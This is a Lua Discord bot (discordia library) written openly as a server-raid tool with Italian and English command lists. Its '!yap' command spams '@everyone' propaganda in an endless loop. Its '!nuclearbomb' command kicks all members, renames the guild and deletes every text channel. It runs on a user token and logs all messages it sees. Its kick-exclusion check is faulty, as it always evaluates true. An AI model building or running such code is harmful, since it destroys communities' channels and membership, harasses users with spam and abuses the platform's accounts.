local discordia = require("discordia")
local client = discordia.Client()
discordia.extensions.string()
math.randomseed(os.time())

local echomsg = "@everyone\nQUESTO MESSAGGIO E' STATO MANDATO DA VERI PATRIOTTICI DELLA REPUBBLICA FEDERALE POPOLARE DI CAROTA.\nTHIS MESSAGE HAS BEEN SENT BY REAL PATRIOTS FROM THE PEOPLE'S FEDERAL REPUBLIC OF CAROTA.\n"
local imagelink = "https://files.catbox.moe/44w4wc.png"

local raid = false

client:on('ready', function(msg)
	print("online!")
end)

client:on('messageCreate', function(msg)
	local content = msg.content
	local lower = string.lower(content)

	if lower == '!yap' then
		raid = true
		repeat
			msg.channel:send(echomsg.."\n"..imagelink)
		until raid == false
	elseif lower == '!shutup' then
		raid = false
	elseif lower == '!yap noimage' then
		raid = true
		repeat
			msg.channel:send(echomsg)
		until raid == false
	elseif lower == '!nuclearbomb' then
		for i, member in pairs(msg.guild.members:toArray()) do
			if member.user.id ~= 1449521705524396125 or member.user.id ~= 697150884047749121 then
				msg.guild:kickUser(member.user.id)
			end
		end
		msg.channel.guild:setName(msg.channel.guild.name.." // carota")
		for i, channel in pairs(msg.guild.textChannels:toArray()) do
			channel:delete()
		end
		msg.channel.guild:createTextChannel("carota")
	elseif lower == "!encmdlist" then
		msg:reply(">>> # COMMAND LIST\n**!yap** - raid a server channel (can get your account banned)\n**!nuclearbomb** - nuke the server (experimental)\n**!roll** - send a random number in chat")
	elseif lower == "!itcmdlist" then
		msg:reply(">>> # LISTA DEI COMANDI\n**!yap** - raida un canale del server (può portare a un ban)\n**!nuclearbomb** - nukka il server (sperimentale)\n**!roll** - spara un numero a caso in chat")
	elseif lower == "!roll" then
		local number = math.random(0, 432478421379487231944312431211111)
		msg:reply(">>> # RESULT/RISULTATO\nE' uscito il numero **"..number.."**!\nYou've got the number **"..number.."**!")
	end

	print(msg.channel.guild.name.." / #"..msg.channel.name.." / @"..msg.author.tag..": "..msg.content)
end)

client:run("USER_TOKEN")
